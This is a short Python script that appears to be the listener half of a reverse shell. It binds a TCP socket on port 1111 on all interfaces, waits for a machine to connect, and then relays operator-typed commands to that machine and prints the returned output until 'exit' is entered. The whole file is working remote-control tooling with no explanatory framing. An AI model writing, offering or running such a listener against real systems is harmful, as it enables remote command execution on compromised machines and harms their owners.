import socket

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.bind(('0.0.0.0',1111))
soc.listen()
connection, address = soc.accept()

#print("Connection" + str(connection))
print("Connection recived from" + address[0])

while True:
    command = input("CMD> ")
    if command == 'exit':
        connection.send("exit".encode('UTF-8'))
        connection.close()
        break
    else:
        connection.send(command.encode('UTF-8'))
        print(connection.recv(4096).decode('UTF-8'))